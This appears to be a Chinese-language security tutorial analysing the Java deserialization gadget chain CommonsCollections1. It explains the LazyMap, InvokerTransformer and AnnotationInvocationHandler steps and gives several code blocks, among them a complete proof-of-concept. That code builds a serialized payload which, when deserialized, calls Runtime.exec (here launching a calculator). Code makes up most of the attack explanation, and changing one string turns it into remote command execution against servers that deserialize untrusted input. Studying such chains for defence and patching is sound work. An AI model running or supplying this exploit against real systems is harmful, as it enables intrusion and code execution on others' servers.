    Java反序列化CommonsCollections1分析

    版本要求：

    • DK版本：1.7 （8u71之后已修复不可利用）
    • CommonsCollections 3.1 - 3.2.1

    具备知识：

    • 反射
    • 动态代理

    0x02 后半条链进行分析：

    这里先对后半条链进行分析，然后使用反推思想再去分析为什么需要前半条链

    在commons collections中有一个Transformer接口，其中包含一个transform方法，通过实现此接口来达到类型转换的目的。

    接口没办法直接调用，我们需要去找它的实现类，cc1中主要利用了以下三个。

    • InvokerTransformer：其transform方法实现了通过反射来调用某方法。

    • ConstantTransformer：它的过程就是在构造函数的时候传⼊⼀个对象，并在transform⽅法将这个对象再返回、。

    • ChainedTransformer：前⼀个回调返回的结果，作为后⼀个回调的参数传⼊。

    所以POC可以这样编写：

    ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
        new ConstantTransformer(Runtime.class), 
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }), 
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),     
        new InvokerTransformer("exec", new Class[] { String.class }, new Object[]{"calc"})});//MAC"calc"换成"open -a Calculator"

    解释下为什么需要这么编写：

    正常我们利用反射去弹计算机可以这样写：

    Class<?> aClass = Class.forName("java.lang.Runtime");
Method getRuntime = aClass.getMethod("getRuntime", null);
Object invoke = getRuntime.invoke(null);

Method exec = aClass.getMethod("exec", String.class);
exec.invoke(invoke,"calc");

    我们把两块代码进行对比：

            new ConstantTransformer(Runtime.class), 
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] })

    相当于执行了：

    Class<?> aClass = Class.forName("java.lang.Runtime");
Method getRuntime = aClass.getMethod("getRuntime", null);

    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] })

    相当于执行了：

    Object invoke = getRuntime.invoke(null);

    new InvokerTransformer("exec", new Class[] { String.class }, new Object[]{"calc"})});

    相当于执行了：

    Method exec = aClass.getMethod("exec", String.class);
exec.invoke(invoke,"calc");

    小知识点：

    getClass() ：获取运行对象的类

    查看对应的资料发现 getClass()根据传入参数的不同返回数据也会有不同

    1. 如果传入的是对象， 那么返回的就是当前对象的类

    2. 如果传入的是类，那么返回的就是 java.lang.Class

    invoke:

    1. invoke调用普通方法时，传入的必须是实例化后的类

    2. invoke调用静态方法时，传入类即可

    到这里后半条的链分析完了，后半条链是进行执行RCE的，然后我们需要找到入口，也就是重写了readObject的类并且这个类会去调用了transform方法。

    我们找到Lazymap#get这个方法中调用了transform，但是我们怎么去调用Lazymap#get这个方法呢，所以我们就有了前半条链，拼接前半条链（入口）+Lazymap#get+后半条链（RCE）

    Lazymap#get

    这里的是this.factory可控的，我们可以通过创建LazyMap实例的方式来设置他的值

    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {
          ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                  new ConstantTransformer(Runtime.class),
                  new InvokerTransformer("getMethod", new Class[] {
                          String.class, Class[].class }, new Object[] {
                          "getRuntime", new Class[0] }),
                  new InvokerTransformer("invoke", new Class[] {
                          Object.class, Object[].class }, new Object[] {
                          null, new Object[0] }),
                  new InvokerTransformer("exec",
                          new Class[] { String.class }, new Object[]{"calc"})});
          HashMap innermap = new HashMap();
          Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
         
          Constructor[] constructors = clazz.getDeclaredConstructors();
          Constructor constructor = constructors[0];
          constructor.setAccessible(true);
          LazyMap map = (LazyMap)constructor.newInstance(innermap,chain);
          map.get(123);
     }

    PS：这里使用反射，因为LazyMap构造方法中，是protected，而不是product，所以需要用反射来调用。

    0x03前半部链进行分析：

    目的：寻找重写了readObject()并调用LazyMap类的get方法

    前半部链AnnotationInvocationHandler，用于触发LazyMap的get方法。AnnotationInvocationHandler是一个代理类，并且可以序列化，且重写了readObject，所以当我们服务端存在可控的readObject方法的时候，，服务端会执行AnnotationInvocationHandler重写的readObject，触发后续的RCE。

    AnnotationInvocationHandler#readObject

    AnnotationInvocationHandler#invoke

    关键点来了，是怎么进入AnnotationInvocationHandler#invoke 方法中呢？

    因为实际上这个类实际就是一个InvocationHandler，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，this.memberValues赋值为LazyMap对象，且LazyMap对象被创建动态代理类，代理接口为Map.class，当调用Map.class类中的方法时，将会调用AnnotationInvocationHandler#invoke方法。entrySet方法是Map.class中的方法，因此会进入AnnotationInvocationHandler#invoke方法中 。

    Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);//反射创建AnnotationInvocationHandler的Class，并调用带参构造器
handler_constructor.setAccessible(true);
InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //被代理对象

    最终POC：

    public class cc1 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {

        //反序列化利用后半条链
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class), // 返回 java.lang.Runtime,但我们知道Runtime.class经过getClass()，之后返回的只会是java.lang.Class
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),  //利用Runtime.class中的getMethod 获取getRuntime，这样我们就能得到一个Runtime实例
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),      // 上面返回的应该是getRuntime的这个静态方法 获取反射类中的invoke类执行getRuntime
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[]{"calc"})});//MAC"calc"换成"open -a Calculator"  // 调用返回实例中的exec

        HashMap innermap = new HashMap();
        Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap"); //创建LazyMap的Class
        Constructor[] constructors = clazz.getDeclaredConstructors();    //调用LazyMap的空参构造器集
        Constructor constructor = constructors[0];//调用LazyMap第一个构造器
        constructor.setAccessible(true);
        Map map = (Map)constructor.newInstance(innermap,chain);  

        //反序列化利用前半条链
        Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);//反射创建AnnotationInvocationHandler的Class，并调用带参构造器
        handler_constructor.setAccessible(true);
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); /

        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象

        Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);//使用构造器创建对象，传入proxy_map

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc1"));
            outputStream.writeObject(handler);//序列化handle到cc1文件中
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc1"));
            inputStream.readObject(); //恢复对象，反序列化使用readObject获取对象，这里调用了AnnotationInvocationHandler被重写的readObject
        }catch(Exception e){
            e.printStackTrace();
        }

    }
}

    疑问：

    1.为什么创建AnnotationInvocationHandler实例时传入的第一个参数是Override.class?

    因为传入第一个参数调用了isAnnotation判断是否是注解类，并且这里的注解类需要使用java自带的

    2.为什么已经创建了代理对象proxyMap了，还需要创建AnnotationInvocationHandler的实例对象。

    Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class)
handler_constructor.setAccessible(true);
InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);

Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); 
InvocationHandler handler = (InvocationHandler)handler_constructor.newInstance(Override.class,proxy_map);

    代理后的对象叫做proxy_map，但我们不能直接对其进行序列化，因为我们入口点是sun.reflect.annotation.AnnotationInvocationHandler#readObject ，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹。
